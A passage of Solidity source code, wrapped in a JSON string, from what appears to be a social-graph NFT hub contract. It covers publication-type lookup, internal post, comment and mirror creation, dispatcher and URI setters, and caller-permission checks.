override\n        returns (DataTypes.PubType)\n    {\n        if (pubId == 0 || _profileById[profileId].pubCount < pubId) {\n            return DataTypes.PubType.Nonexistent;\n        } else if (_pubByIdByProfile[profileId][pubId].collectModule == address(0)) {\n            return DataTypes.PubType.Mirror;\n        } else {\n            if (_pubByIdByProfile[profileId][pubId].profileIdPointed == 0) {\n                return DataTypes.PubType.Post;\n            } else {\n                return DataTypes.PubType.Comment;\n            }\n        }\n    }\n\n    /**\n     * @dev Overrides the ERC721 tokenURI function to return the associated URI with a given profile.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return _profileById[tokenId].imageURI; // temp\n    }\n\n    /// ****************************\n    /// *****INTERNAL FUNCTIONS*****\n    /// ****************************\n\n    function _setGovernance(address newGovernance) internal {\n        address prevGovernance = _governance;\n        _governance = newGovernance;\n        emit Events.GovernanceSet(msg.sender, prevGovernance, newGovernance, block.timestamp);\n    }\n\n    function _createPost(\n        uint256 profileId,\n        string memory contentURI,\n        address collectModule,\n        bytes memory collectModuleData,\n        address referenceModule,\n        bytes memory referenceModuleData\n    ) internal {\n        PublishingLogic.createPost(\n            profileId,\n            contentURI,\n            collectModule,\n            collectModuleData,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n    function _createMirror(\n        uint256 profileId,\n        uint256 profileIdPointed,\n        uint256 pubIdPointed,\n        address referenceModule,\n        bytes calldata referenceModuleData\n    ) internal {\n        PublishingLogic.createMirror(\n            profileId,\n            profileIdPointed,\n            pubIdPointed,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _setDispatcher(uint256 profileId, address dispatcher) internal {\n        _dispatcherByProfile[profileId] = dispatcher;\n        emit Events.DispatcherSet(profileId, dispatcher, block.timestamp);\n    }\n\n    function _setProfileImageURI(uint256 profileId, string memory imageURI) internal {\n        _profileById[profileId].imageURI = imageURI;\n        emit Events.ProfileImageURISet(profileId, imageURI, block.timestamp);\n    }\n\n    function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal {\n        _profileById[profileId].followNFTURI = followNFTURI;\n        emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    }\n\n    function _clearHandleHash(uint256 profileId) internal {\n        bytes32 handleHash = keccak256(bytes(_profileById[profileId].handle));\n        _profileIdByHandleHash[handleHash] = 0;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        if (_dispatcherByProfile[tokenId] != address(0)) {\n            _setDispatcher(tokenId, address(0));\n        }\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId])\n            revert Errors.NotProfileOwnerOrDispatcher();\n    }\n\n    function _validateCallerIsProfileOwner(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId)) revert Errors.NotProfileOwner();\n    }\n\n    function _validateCallerIsGovernance() internal view {\n        if (msg.sender != _governance) revert Errors.NotGovernance();\n    }\n\n    function _validateCallerIsWhitelistedProfileCreator() internal view {\n        if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n    }\n\n    function getRevision() internal pure virtual override returns (uint256) {\n        return REVISION;\n    }\n}"
    }
  ]
}